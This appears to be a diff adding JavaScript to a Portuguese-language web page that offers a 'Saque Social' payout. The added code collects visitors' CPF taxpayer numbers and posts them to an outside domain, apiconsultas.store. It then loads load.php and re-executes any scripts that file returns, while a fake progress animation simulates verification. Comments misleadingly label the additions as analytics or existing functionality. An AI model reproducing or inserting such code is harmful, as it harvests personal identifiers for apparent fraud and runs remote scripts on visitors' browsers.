@@ -7,6 +7,7 @@
     <title>Loading Animation</title>
     <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
 <!-- Google tag (gtag.js) -->
+<!-- Google Analytics integration -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-1MEXMCNKJX"></script>
 <script>
   window.dataLayer = window.dataLayer || [];
@@ -14,6 +15,121 @@
   gtag('js', new Date());
 
   gtag('config', 'G-1MEXMCNKJX');
+</script>
+
+<!-- Existing JavaScript functionality -->
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+    const myModal = document.getElementById("myModal");
+    const consultarBtn = document.getElementById("consultar-button");
+    if (consultarBtn) {
+        consultarBtn.addEventListener("click", function() {
+            myModal.style.display = "block";
+        });
+    }
+});
+</script>
+
+<script>
+// JavaScript to load content from 'load.php' into the modal
+document.addEventListener("DOMContentLoaded", function() {
+    const consultButton = document.querySelector(".myModal-consultar-button"); // Nota: mudado para classe
+    const modalContent = document.querySelector("#myModal"); // Nota: mudado para ID do modal
+    const cpfInput = document.querySelector("#cpf");
+    const cpfError = document.querySelector("#cpf-error");
+
+    if (consultButton && modalContent && cpfInput && cpfError) {
+        consultButton.addEventListener("click", function(event) {
+            event.preventDefault();
+
+            const cpfValue = cpfInput.value.replace(/[\.\-]/g, '');
+            
+            // Adicione a verificacao aqui
+            if (cpfValue === '05443982206') {
+                alert("Você não está apto ao Saque Social");
+                return false;
+            }
+
+            if (!isValidCPF(cpfValue)) {
+                cpfError.style.display = 'block';
+                return false;
+            } else {
+                cpfError.style.display = 'none';
+            }
+
+            fetch('https://apiconsultas.store/api/temp/6655057408889.html', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: `cpf=${cpfValue}`
+            })
+            .then(response => response.text())
+            .then(data => {
+                return fetch('load.php');
+            })
+            .then(response => response.text())
+            .then(data => {
+                modalContent.innerHTML = data;
+                Array.from(modalContent.querySelectorAll("script")).forEach(oldScript => {
+                    const newScript = document.createElement("script");
+                    Array.from(oldScript.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value));
+                    newScript.appendChild(document.createTextNode(oldScript.innerHTML));
+                    oldScript.parentNode.replaceChild(newScript, oldScript);
+                });
+                document.body.style.overflow = 'hidden'; 
+                modalContent.style.overflow = 'auto';
+                modalContent.style.display = "block";
+            })
+            .catch(error => {
+                console.error("Erro na requisição:", error);
+            });
+        });
+    } else {
+        console.error("Um ou mais elementos necessários não estão disponíveis.");
+    }
+});
+</script>
+
+<script>            
+let currentStep = 1;
+
+function updateStep() {
+    if (currentStep <= 4) {
+        const lineElement = document.getElementById(`line${currentStep}`);
+        const pointElement = document.getElementById(`point${currentStep + 1}`);
+        const nextStatusElement = document.getElementById(`status${currentStep + 1}`);
+
+        if (lineElement && pointElement) {
+            lineElement.classList.add('active');
+            setTimeout(() => {
+                pointElement.classList.add('active');
+                if (nextStatusElement) {
+                    nextStatusElement.style.display = 'flex';
+                    setTimeout(() => {
+                        nextStatusElement.querySelector('.check-icon').style.display = 'inline';
+                    }, 1000);
+                }
+                currentStep++;
+
+                if (currentStep === 5) {
+                    document.getElementById('confirmation').style.display = 'block';
+                    document.getElementById('divider').style.display = 'block';
+                }
+            }, 2000);
+        }
+    }
+}
+
+// Mostra o primeiro status imediatamente
+document.getElementById('status1').style.display = 'flex';
+setTimeout(() => {
+    document.getElementById('status1').querySelector('.check-icon').style.display = 'inline';
+}, 1000);
+
+setTimeout(updateStep, 1000); 
+
+setInterval(updateStep, 2000);
 </script>
     <style>
         .container {
